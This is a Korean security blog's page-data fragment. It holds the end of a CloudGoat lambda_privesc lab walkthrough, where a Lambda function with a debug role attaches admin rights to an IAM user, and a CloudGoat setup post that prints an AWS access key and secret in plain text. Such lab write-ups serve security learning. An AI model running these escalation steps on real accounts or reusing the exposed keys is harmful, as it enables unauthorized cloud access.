auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABmElEQVQoz3WR2W7aUBRFrwdMgsHY2DhgbDyQAgbHkGCGCFrSQe0LatWnqP3//1iVb6OqapWHpStt6eyz97nifnNkf3jiePrI6fyF9HRhUVQsi4pq+5ZyfaAs9+SrLe+iih/Bmef4PT/jDzyHT3z3d9wFE/zgDVG8RJidgDgrCaKcUZSTJks8f0KrPcTuxRLLjiRtd4xuDxFGF9G0EY0uwnBQDI9G00Nr9BD1QHl/YpZvWdwdiLMV2e1abrsZTnH7Ka6f4bgxrpfieSmt1g2qaqNpDppmo2o2ygui64x5qM5ESSFTNZouxlWf5rWPbrgI0UEo1p+BGlV3XkVYdsju8ROzvGK+2BGEc0m9IAhzmazrRP+ZvWYsrs2BrDhOC1mzY4dctXyZ1uz8pk5c30fTHXS99w+O1KVhXbk2rO+XZCuZbDiYyI+o9bY1otHsI4T5Ur2DUE2EYv711loXRbVR6oTT2ZqHzZFytWe+3GDlj0TxnFF4S5zmxEnOZFKQTAsqd8E3e8vF23Nxtnx193xuL8msAYbpy4S/AP/GzNcsBsXFAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"10\"\n        title=\"10\"\n        src=\"/static/d53fd0534127fb849317f5e0c7e37fe3/37523/10.png\"\n        srcset=\"/static/d53fd0534127fb849317f5e0c7e37fe3/e9ff0/10.png 180w,\n/static/d53fd0534127fb849317f5e0c7e37fe3/f21e7/10.png 360w,\n/static/d53fd0534127fb849317f5e0c7e37fe3/37523/10.png 720w,\n/static/d53fd0534127fb849317f5e0c7e37fe3/302a4/10.png 1080w,\n/static/d53fd0534127fb849317f5e0c7e37fe3/7798c/10.png 1183w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>새로운 lambda 함수를 생성하는 방법은 <code class=\"language-text\">lambda-create-function</code> 기능을 이용하여 lambda 핸들러 함수를 등록할 수가 있습니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws <span class=\"token keyword\">lambda</span> create<span class=\"token operator\">-</span>function \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>function<span class=\"token operator\">-</span>name admin_function \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>runtime python3<span class=\"token punctuation\">.</span><span class=\"token number\">6</span> \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>role arn<span class=\"token punctuation\">:</span>aws<span class=\"token punctuation\">:</span>iam<span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token number\">712987748923</span><span class=\"token punctuation\">:</span>role<span class=\"token operator\">/</span>cg<span class=\"token operator\">-</span>debug<span class=\"token operator\">-</span>role<span class=\"token operator\">-</span>lambda_privesc_cgidejvizwx9mo \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>handler lambda_function<span class=\"token punctuation\">.</span>lambda_handler \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token builtin\">zip</span><span class=\"token operator\">-</span><span class=\"token builtin\">file</span> fileb<span class=\"token punctuation\">:</span><span class=\"token operator\">//</span>lambda_function<span class=\"token punctuation\">.</span>py<span class=\"token punctuation\">.</span><span class=\"token builtin\">zip</span> \\\n\t<span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile lambdaManager</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 6.666666666666667%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAYAAADeko4lAAAACXBIWXMAAAsTAAALEwEAmpwYAAAATUlEQVQI1wXBURJAIBRAUUtpRvVEJYk+jIzpy/4XdJ0z3Gvjk4cujT69XCpjtMdKYpozyexUfXCMhapPimRCLPhQUKFi3IaViFsy4hI/4jAe/6JHhyIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"11\"\n        title=\"11\"\n        src=\"/static/9f7cad50d171810ffd41fc7403e4b62d/37523/11.png\"\n        srcset=\"/static/9f7cad50d171810ffd41fc7403e4b62d/e9ff0/11.png 180w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/f21e7/11.png 360w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/37523/11.png 720w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/302a4/11.png 1080w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/07a9c/11.png 1440w,\n/static/9f7cad50d171810ffd41fc7403e4b62d/ddb6a/11.png 1592w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>성공적으로 완료가 된 상황이라면 다음과 같이 StatusCode:200을 반환합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 31.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAABOklEQVQY02WQW2+jMBBGHRIIEC42N3ONIbAtIau2apqH/f8/7KwgfajUh6NP8oyOZ0ac+4V5+eK6PKi6K34xEYQlQVQRq5ZINlvGsqU5tvR+j/ENxjP0Xo92NK6b4ngFrq8R83Ln7eMft78PxvlO/vqgbibyoifXA9l3Fnrg5o/coyufK+HMV7gwuTXBKcf1S05hjdDVRGduXKZ3dP1ClF/IioFYdYRxsxHJ9pl2gTqWSGdFo5ySwE6xHcXeTjg4KULsom3Usn5BJmeyYhWOVM1M3V63T9ZaUf4hTs6Eq1y2yNTgBRViL9ntFbst5Q9h84pKe8pyQlerYCKIGrzTcxXrkCCs8Df7GGE9ZdZBIdb7qKQjzQwyM3j5iEpa5PqWG1R63mprT+d2jP7A5ZvJH6iOGs9Lsexkm/A/MgmVUFyl4mEAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"12\"\n        title=\"12\"\n        src=\"/static/0edd4cd12586686881d2edf3d9a0aab6/37523/12.png\"\n        srcset=\"/static/0edd4cd12586686881d2edf3d9a0aab6/e9ff0/12.png 180w,\n/static/0edd4cd12586686881d2edf3d9a0aab6/f21e7/12.png 360w,\n/static/0edd4cd12586686881d2edf3d9a0aab6/37523/12.png 720w,\n/static/0edd4cd12586686881d2edf3d9a0aab6/302a4/12.png 1080w,\n/static/0edd4cd12586686881d2edf3d9a0aab6/b9024/12.png 1203w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">lambda invoke</code> 기능을 이용하여 생성한 lambda 코드를 실핼한 결과 값을 로컬 내에 저장을 하고 해당 결과를 확인 해보면 등록하려고 하였던 debug rule이 attached 된 것을 확인하고 모든 시나리오가 끝났습니다.</li>\n</ul>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%EA%B0%9C%EC%9A%94\">시나리오 개요</a></p>\n<ul>\n<li><a href=\"#%EC%9E%90%EC%9B%90\">자원</a></li>\n<li><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90\">취약점</a></li>\n<li><a href=\"#%EB%AA%A9%ED%91%9C\">목표</a></li>\n<li><a href=\"#exploit-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 흐름도</a></li>\n<li><a href=\"#%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%99%98%EA%B2%BD%EC%84%A4%EC%A0%95\">시나리오 환경설정</a></li>\n<li><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4-%ED%9D%90%EB%A6%84%EB%8F%84\">exploit 시나리오 흐름도</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#exploit-%EC%8B%9C%EB%82%98%EB%A6%AC%EC%98%A4\">Exploit 시나리오</a></p>\n<ul>\n<li><a href=\"#iam-user-chris-%EC%A0%95%EB%B3%B4%EB%A5%BC-%ED%86%A0%EB%8C%80%EB%A1%9C-%EC%82%AC%EC%9A%A9%ED%95%A0-%EC%88%98-%EC%9E%88%EB%8A%94-%EA%B6%8C%ED%95%9C-%EB%82%98%EC%97%B4\">IAM User: Chris 정보를 토대로 사용할 수 있는 권한 나열</a></li>\n<li><a href=\"#lambda-%EC%A0%95%EC%B1%85-%EA%B3%BC-%EA%B4%80%EB%A0%A8%EB%90%9C-%EA%B8%B0%EB%8A%A5-%EB%82%98%EC%97%B4\">lambda 정책 과 관련된 기능 나열</a></li>\n<li><a href=\"#lambda-manager-debug-%EC%A0%95%EC%B1%85-%EC%A1%B0%ED%9A%8C-%EB%B0%8F-%EB%B6%84%EC%84%9D\">Lambda Manager, debug 정책 조회 및 분석</a></li>\n<li><a href=\"#%EA%B4%80%EB%A6%AC%EC%9E%90-%EC%A0%95%EC%B1%85-%EA%B6%8C%ED%95%9C%EC%9D%84-iam-user-chris%EC%97%90-%EC%97%B0%EA%B2%B0%ED%95%A0-lambda-%ED%95%A8%EC%88%98-%EC%83%9D%EC%84%B1\">관리자 정책 권한을 IAM User: Chris에 연결할 Lambda 함수 생성</a></li>\n</ul>\n</li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 3 (CloudGoat: lambda_privesc)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-3/"}},"prev":{"id":"b5b697e5-aa7d-5fb2-8a25-b9ef2f34a44b","html":"<h1 id=\"클라우드-서비스-취약점-분석-1\" style=\"position:relative;\"><a href=\"#%ED%81%B4%EB%9D%BC%EC%9A%B0%EB%93%9C-%EC%84%9C%EB%B9%84%EC%8A%A4-%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D-1\" aria-label=\"클라우드 서비스 취약점 분석 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>클라우드 서비스 취약점 분석 1</h1>\n<aside>\n💡  클라우드 서비스 취약점 분석 연습을 위해 Rhino Security Lab의 CloudGoat 실습을 진행하도록 하겠습니다.\n<p>다음은 참조 CloudGoat Github 링크입니다.</p>\n<p><a href=\"https://github.com/RhinoSecurityLabs/cloudgoat\">https://github.com/RhinoSecurityLabs/cloudgoat</a></p>\n</aside>\n<h1 id=\"실습-환경-구성\" style=\"position:relative;\"><a href=\"#%EC%8B%A4%EC%8A%B5-%ED%99%98%EA%B2%BD-%EA%B5%AC%EC%84%B1\" aria-label=\"실습 환경 구성 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>실습 환경 구성</h1>\n<h3 id=\"필수-설치-패키지\" style=\"position:relative;\"><a href=\"#%ED%95%84%EC%88%98-%EC%84%A4%EC%B9%98-%ED%8C%A8%ED%82%A4%EC%A7%80\" aria-label=\"필수 설치 패키지 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>필수 설치 패키지</h3>\n<ul>\n<li>Linux or MacOS. Windows is not officially supported.\n<ul>\n<li>Argument tab-completion requires bash 4.2+ (Linux, or OSX with some difficulty).</li>\n</ul>\n</li>\n<li>Python3.6+ is required.</li>\n<li>Terraform >= 0.14 <a href=\"https://learn.hashicorp.com/terraform/getting-started/install.html\">installed and in your $PATH</a>.</li>\n</ul>\n<p><a href=\"https://learn.hashicorp.com/tutorials/terraform/install-cli\">Install Terraform | Terraform - HashiCorp Learn</a></p>\n<ul>\n<li>The AWS CLI <a href=\"https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html\">installed and in your $PATH</a>, and an AWS account with sufficient privileges to create and destroy resources.</li>\n<li><a href=\"https://stedolan.github.io/jq/\">jq</a></li>\n</ul>\n<p><a href=\"https://stedolan.github.io/jq/\">jq</a></p>\n<h3 id=\"설치\" style=\"position:relative;\"><a href=\"#%EC%84%A4%EC%B9%98\" aria-label=\"설치 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>설치</h3>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\">$ git <span class=\"token keyword\">clone</span> https<span class=\"token punctuation\">:</span><span class=\"token comment\">//github.com/RhinoSecurityLabs/cloudgoat.git</span>\n$ cd <span class=\"token class-name type-declaration\">cloudgoat</span>\n$ pip3 install <span class=\"token operator\">-</span>r <span class=\"token operator\">.</span><span class=\"token operator\">/</span>core<span class=\"token operator\">/</span>python<span class=\"token operator\">/</span>requirements<span class=\"token operator\">.</span><span class=\"token class-name type-declaration\">txt</span>\n$ chmod u<span class=\"token operator\">+</span>x cloudgoat<span class=\"token operator\">.</span>py</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 17.22222222222222%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAo0lEQVQI13WOOw6CQAAFUQmxUxIMirKAyB92RQSjUGii9z/SGCmNFq+YYiZPi5ITrlewskO8oGQnMhxRsHZz9gfF1k3Zxxkikdi+QjcsJrMlU938OS2Ma4RfYm8imvaBPA5I1VPJG931SZp3VGqgu72QTc/MMNGmi1H+hL/jWpK1eEHF2olR9UBRXcnKC1HacDrfidNm5CBvcbwI0xIY89Xfl28E+0/iErUWYgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/e4fa6c27ca6e77a3c59139f0577597f1/37523/0.png\"\n        srcset=\"/static/e4fa6c27ca6e77a3c59139f0577597f1/e9ff0/0.png 180w,\n/static/e4fa6c27ca6e77a3c59139f0577597f1/f21e7/0.png 360w,\n/static/e4fa6c27ca6e77a3c59139f0577597f1/37523/0.png 720w,\n/static/e4fa6c27ca6e77a3c59139f0577597f1/71c8e/0.png 875w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAq0lEQVQY03WQ3QoCIRCF9/0fL+hy6SaiHdPWn1x1XE+MVhCRcGD8js5wZopxwyNu2PcdtdYfCW+t/RXXCuaCmTbMlDA550BEMEbDGANrLdZ17bLOwns/6hf/8q3tf4zWOJ4Ih/mKKYSA82XBojTU7Q4ZII+11r0ZKcJC1JkMlibivWtSqt9jcHh4i0kipVzBVSKPeMKYGWhAKhm5lBGP+ePLOuQkzmM1wlvDE3dkNSM8iDotAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"1\"\n        title=\"1\"\n        src=\"/static/9e04904dd6fc1d129d314db67fedd32e/37523/1.png\"\n        srcset=\"/static/9e04904dd6fc1d129d314db67fedd32e/e9ff0/1.png 180w,\n/static/9e04904dd6fc1d129d314db67fedd32e/f21e7/1.png 360w,\n/static/9e04904dd6fc1d129d314db67fedd32e/37523/1.png 720w,\n/static/9e04904dd6fc1d129d314db67fedd32e/302a4/1.png 1080w,\n/static/9e04904dd6fc1d129d314db67fedd32e/07a9c/1.png 1440w,\n/static/9e04904dd6fc1d129d314db67fedd32e/99375/1.png 1525w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>IAM 사용자 추가를 누른 후 AWS IAM Full-Admin 권한의 사용자 생성을 진행하여 cloudgoat 환경에서 다양한 인스턴스및 여러 기능들을 수행할 수 있도록 환경 구성을 진행해야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.11111111111111%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAAsTAAALEwEAmpwYAAABWElEQVQ4y52Ty07DMBBF/e98CztW7PgAVrBFQhVCiCpN82iS+v2IfZHtNmpKgJaRjpxxkhlf6w6hdA8pJWJ47ydCCIml/HT/HILzCAH7fW6itYZSCkKIBGMcxpjDZ2ER4p2FcxbjmDuM44i+71PRCOc8FXNunH76LYjTHIZ1aJsadV2jLEtsNiWqqkp5PNFP8hYlr3cat48F3koK70ySqXVe/xOk6jkent6x+thACjZJjQzDcDXEWYN6vcJ2u0XVdOj7YSp2WvxSyOgDjKSQSkMoC2PdzCbXQpxz4EKCMQbOWVqjZZY8eVFB70coKSA4Az3Y5Mi5uY+2Olpsvp/fESEVimqHz3pA0+7Qtjt0XYeqqtE0LeqmAaVs8iOlNOVCyNyYcTCalUXIa0Fxc/eC++cCWuVpiJaJV2GtTfxl5plt4nGN1rBGZw8qnSTMp/H7DOfngODnV/IFFqf1Xxjnq18AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"0\"\n        title=\"0\"\n        src=\"/static/ddc19233c1789764932065ff72685f2c/37523/2.png\"\n        srcset=\"/static/ddc19233c1789764932065ff72685f2c/e9ff0/2.png 180w,\n/static/ddc19233c1789764932065ff72685f2c/f21e7/2.png 360w,\n/static/ddc19233c1789764932065ff72685f2c/37523/2.png 720w,\n/static/ddc19233c1789764932065ff72685f2c/91b29/2.png 983w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>AdministratorAccess 정책 권한을 설정한후 해당 access-key, secret-key를 저장하여 AWS cli profile를 설정을 진행합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">$ aws configure <span class=\"token operator\">-</span><span class=\"token operator\">-</span>profile cloudgoat\n\ncat <span class=\"token operator\">~</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>aws<span class=\"token operator\">/</span>credentials\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span>\naws_access_key_id <span class=\"token operator\">=</span> AKIA2MALBVI5QLOGHLZI\naws_secret_access_key <span class=\"token operator\">=</span> JNiZCE<span class=\"token operator\">/</span>m4HOOyewKqNY8B2z1Ygs<span class=\"token operator\">+</span><span class=\"token operator\">+</span>SSNCkwpCCat\ncat <span class=\"token operator\">~</span><span class=\"token operator\">/</span><span class=\"token punctuation\">.</span>aws<span class=\"token operator\">/</span>config\n<span class=\"token punctuation\">[</span>cloudgoat<span class=\"token punctuation\">]</span>\nregion <span class=\"token operator\">=</span> us<span class=\"token operator\">-</span>east<span class=\"token operator\">-</span><span class=\"token number\">1</span>\n</code></pre></div>\n<ul>\n<li>설정이 완료되면 credentials, config 파일에 각각 저장이 됩니다.</li>\n<li>앞에서 설정한 각 정보들을 그대로 cloudgoat 에 적용하여 설치를 마무리 합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>cloudgoat<span class=\"token punctuation\">.</span>py config profile\n$ <span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>cloudgoat<span class=\"token punctuation\">.</span>py config whitelist <span class=\"token operator\">-</span><span class=\"token operator\">-</span>auto</code></pre></div>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#%ED%95%84%EC%88%98-%EC%84%A4%EC%B9%98-%ED%8C%A8%ED%82%A4%EC%A7%80\">필수 설치 패키지</a></li>\n<li><a href=\"#%EC%84%A4%EC%B9%98\">설치</a></li>\n</ul>\n</div>","frontmatter":{"date":"December 31, 2021","title":"클라우드 서비스 취약점 분석 1 (클라우드 서비스 취약점 및 공격 벡터)","categories":"CLOUD","author":"Zer0Luck","emoji":"🤭"},"fields":{"slug":"/cloud-service-vuln-1/"}},"site":{"siteMetadata":{"siteUrl":"https://dnsdudrla97.github.io","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/cloud-service-vuln-2/","nextSlug":"/cloud-service-vuln-3/","prevSlug":"/cloud-service-vuln-1/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}